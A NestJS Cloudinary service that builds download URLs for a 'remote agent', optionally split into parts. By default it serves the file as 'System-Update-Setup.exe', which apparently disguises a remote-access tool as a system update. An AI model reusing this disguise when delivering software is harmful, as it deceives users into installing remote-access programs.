import { Injectable } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { v2 as cloudinary } from 'cloudinary';

@Injectable()
export class CloudinaryService {
  private readonly configured: boolean;

  constructor(private readonly config: ConfigService) {
    const cloudName = this.config.get<string>('CLOUDINARY_CLOUD_NAME')?.trim();
    const apiKey = this.config.get<string>('CLOUDINARY_API_KEY')?.trim();
    const apiSecret = this.config.get<string>('CLOUDINARY_API_SECRET')?.trim();

    this.configured = !!(cloudName && apiKey && apiSecret);

    if (this.configured) {
      cloudinary.config({
        cloud_name: cloudName,
        api_key: apiKey,
        api_secret: apiSecret,
        secure: true,
      });
    }
  }

  isConfigured(): boolean {
    return this.configured;
  }

  getAgentPartUrls(): string[] {
    return this.parsePartUrls(
      this.config.get<string>('CLOUDINARY_AGENT_PARTS')?.trim(),
    );
  }

  getAgentPortablePartUrls(): string[] {
    return this.parsePartUrls(
      this.config.get<string>('CLOUDINARY_AGENT_PORTABLE_PARTS')?.trim(),
    );
  }

  getAgentZipPartUrls(): string[] {
    return this.parsePartUrls(
      this.config.get<string>('CLOUDINARY_AGENT_ZIP_PARTS')?.trim(),
    );
  }

  private parsePartUrls(raw?: string): string[] {
    if (!raw) {
      return [];
    }

    if (raw.startsWith('[')) {
      try {
        const parsed = JSON.parse(raw) as unknown;
        return Array.isArray(parsed)
          ? parsed.filter((value): value is string => typeof value === 'string')
          : [];
      } catch {
        return [];
      }
    }

    return raw
      .split('|')
      .map((value) => value.trim())
      .filter(Boolean);
  }

  getAgentDownloadUrl(): string | null {
    const directUrl = this.config.get<string>('CLOUDINARY_AGENT_URL')?.trim();
    if (directUrl) {
      return directUrl;
    }

    if (this.getAgentPartUrls().length > 0) {
      return null;
    }

    if (!this.configured) {
      return null;
    }

    const publicId =
      this.config.get<string>('CLOUDINARY_AGENT_PUBLIC_ID')?.trim() ||
      'remote-agent/System-Update-Setup';

    const resourceType =
      this.config.get<string>('CLOUDINARY_AGENT_RESOURCE_TYPE')?.trim() ||
      'raw';

    return cloudinary.url(publicId, {
      resource_type: resourceType,
      secure: true,
      sign_url: false,
      flags: 'attachment:System-Update-Setup.exe',
    });
  }
}
